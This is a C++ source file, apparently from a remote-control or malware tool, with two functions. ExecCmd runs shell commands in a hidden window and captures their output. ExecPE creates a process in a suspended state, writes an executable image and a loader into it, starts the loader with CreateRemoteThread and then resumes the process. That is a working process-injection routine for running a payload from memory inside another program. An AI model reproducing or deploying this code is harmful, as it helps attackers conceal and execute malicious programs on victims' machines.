#include "ExecCmd.h"
#include <stdio.h>

#include "../../Common/PE/pe.h"

void GetStatus(HANDLE hProcess, HANDLE hStdOutRead, bool &bRead, bool &bWrite, bool &bAlive)
{
	if (hProcess != INVALID_HANDLE_VALUE)
	{
		DWORD dwAvaiableData = 0;
		if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &dwAvaiableData, NULL))
		{
			printf("[GetStatus] PeekNamedPipe failed. err#%d.", GetLastError());
		}
		else
		{
			bRead = dwAvaiableData > 0;

			DWORD dwExitCode;
			BOOL getResult = GetExitCodeProcess(hProcess, &dwExitCode);
			if (getResult != TRUE || dwExitCode != STILL_ACTIVE)
			{
				bWrite = bAlive = false;
			}
			else
			{
				bWrite = bAlive = true;
			}
		}
	}
}

int GetSize(HANDLE hStdOutRead)
{
	DWORD dwAvaiableData = 0;
	if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &dwAvaiableData, NULL))
	{
		printf("[GetSize] PeekNamedPipe failed. err#%d.", GetLastError());
	}

	return dwAvaiableData;
}

int Read(HANDLE hStdOutRead, void *pBuf, int sztBuf)
{
	int ret = 0;
	DWORD dwReadByte = 0;
	if (ReadFile(hStdOutRead, pBuf, sztBuf, &dwReadByte, NULL) != TRUE)
	{
		printf("[Read] Read file pipe failed");
	}
	else
	{
		ret = (int)dwReadByte;
	}

	return ret;
}

std::string ExecCmd(std::string cmd)
{
	std::string result = "";

	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hStdInRead = INVALID_HANDLE_VALUE;
	HANDLE hStdInWrite = INVALID_HANDLE_VALUE;
	HANDLE hStdOutRead = INVALID_HANDLE_VALUE;
	HANDLE hStdOutWrite = INVALID_HANDLE_VALUE;

	SECURITY_ATTRIBUTES SecAttr;
	SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecAttr.bInheritHandle = TRUE;
	SecAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &SecAttr, 0))
		printf("[ExecCmd] StdOut CreatePipe");
	else if(!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
		printf("[ExecCmd] StdOut SetHandleInformation");
	else if(!CreatePipe(&hStdInRead, &hStdInWrite, &SecAttr, 0))
		printf("[ExecCmd] StdIn CreatePipe");
	else if(!SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0))
		printf("[ExecCmd] StdIn SetHandleInformation");
	else
	{
		PROCESS_INFORMATION ProcInfo;
		STARTUPINFOA StartInfo;
		BOOL bSuccess = FALSE;

		ZeroMemory(&ProcInfo, sizeof(PROCESS_INFORMATION));

		ZeroMemory(&StartInfo, sizeof(STARTUPINFOA));
		StartInfo.cb = sizeof(STARTUPINFOA);
		StartInfo.hStdError = hStdOutWrite;
		StartInfo.hStdOutput = hStdOutWrite;
		StartInfo.hStdInput = hStdInRead;
		StartInfo.wShowWindow = SW_HIDE;
		StartInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		//CHAR szCMDLine[MAX_PATH * 3];
		//lstrcpynA(szCMDLine, cmd.c_str(), MAX_PATH * 3);

		bSuccess = CreateProcessA(NULL,
		(LPSTR)cmd.c_str(),
			NULL,
			NULL,
			TRUE,
			0,
			NULL,
			NULL,
			&StartInfo,
			&ProcInfo);

		if (!bSuccess)
		{
			DWORD er = GetLastError();
			printf("[ExecCmd] CreateProcess with cmd [%s] failed. err#%d.", cmd.c_str(), GetLastError());
		}
		else
		{
			CloseHandle(ProcInfo.hThread);

			bool bAlive = false;
			bool bRead = false;
			bool bWrite = false;
			char buff[10000];

			do 
			{
				GetStatus(ProcInfo.hProcess, hStdOutRead, bRead, bWrite, bAlive);
				if (bRead)
				{
					int r = Read(hStdOutRead, buff, GetSize(hStdOutRead));
					result += std::string(buff, buff + r);
				}
				
			} while (bAlive);		
		}
	}

	return result;
}

std::string ExecPE(char *filepath, std::string cmd, char *exe, DWORD size)
{
	std::string result = "";
	DWORD func_size = (DWORD)End_Load - (DWORD)Load;
	PE *sPe;
	char* buf = (char*)calloc(size + sizeof(PE), 1);
	if (buf)
	{
		sPe = (PE*)buf;
		sPe->size = size;
		memcpy(sPe->buf, exe, size);
		sPe->fnVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
		sPe->fnVirtualFree = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualFree");
		sPe->fnLoadLibraryA = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
		sPe->fnGetProcAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
		sPe->fnmemcpy = GetProcAddress(LoadLibrary("msvcrt.dll"), "memcpy");

		HANDLE hProcess = INVALID_HANDLE_VALUE;
		HANDLE hThread = INVALID_HANDLE_VALUE;
		/*HANDLE hStdInRead = INVALID_HANDLE_VALUE;
		HANDLE hStdInWrite = INVALID_HANDLE_VALUE;
		HANDLE hStdOutRead = INVALID_HANDLE_VALUE;
		HANDLE hStdOutWrite = INVALID_HANDLE_VALUE;*/
		SIZE_T Size;

		/*SECURITY_ATTRIBUTES SecAttr;
		SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		SecAttr.bInheritHandle = TRUE;
		SecAttr.lpSecurityDescriptor = NULL;*/

		/*if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &SecAttr, 0))
			printf("[ExecCmd] StdOut CreatePipe");
		else if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
			printf("[ExecCmd] StdOut SetHandleInformation");
		else if (!CreatePipe(&hStdInRead, &hStdInWrite, &SecAttr, 0))
			printf("[ExecCmd] StdIn CreatePipe");
		else if (!SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0))
			printf("[ExecCmd] StdIn SetHandleInformation");
		else
		{*/
		PROCESS_INFORMATION ProcInfo;
		STARTUPINFOA StartInfo;
		BOOL bSuccess = FALSE;

		ZeroMemory(&ProcInfo, sizeof(PROCESS_INFORMATION));

		ZeroMemory(&StartInfo, sizeof(STARTUPINFOA));
		StartInfo.cb = sizeof(STARTUPINFOA);
		//StartInfo.hStdError = hStdOutWrite;
		//StartInfo.hStdOutput = hStdOutWrite;
		//StartInfo.hStdInput = hStdInRead;
		StartInfo.wShowWindow = SW_HIDE;
		StartInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		//CHAR szCMDLine[MAX_PATH * 3];
		//lstrcpynA(szCMDLine, cmd.c_str(), MAX_PATH * 3);

		bSuccess = CreateProcessA(filepath,
			(LPSTR)cmd.c_str(),
			NULL,
			NULL,
			TRUE,
			4,
			NULL,
			NULL,
			&StartInfo,
			&ProcInfo);

		if (!bSuccess)
		{
			DWORD er = GetLastError();
			printf("[ExecCmd] CreateProcess with cmd [%s] failed. err#%d.", cmd.c_str(), GetLastError());
		}
		else
		{

			hProcess = ProcInfo.hProcess;
			hThread = ProcInfo.hThread;

			LPVOID ParamAddress = VirtualAllocEx(hProcess, NULL, size + sizeof(PE), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			LPVOID FuncAddress = VirtualAllocEx(hProcess, NULL, func_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (ParamAddress && FuncAddress)
			{
				if (WriteProcessMemory(hProcess, ParamAddress, sPe, sizeof(PE) + sPe->size, &Size) 
					&& WriteProcessMemory(hProcess, FuncAddress, Load, func_size, &Size))
				{
					DWORD dwThID = 0;
					HANDLE hTh = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FuncAddress, ParamAddress, NULL, &dwThID);
					WaitForSingleObject(hTh, 0xffffffff);
					CloseHandle(hTh);

					/*bool bAlive = false;
					bool bRead = false;
					bool bWrite = false;
					char buff[10000];

					do
					{
						GetStatus(ProcInfo.hProcess, hStdOutRead, bRead, bWrite, bAlive);
						if (bRead)
						{
							int r = Read(hStdOutRead, buff, GetSize(hStdOutRead));
							result += std::string(buff, buff + r);
						}

					} while (bAlive);*/

					ResumeThread(hThread);
				}
			}			
		}
		//}

		free(buf);
	}

	return result;
}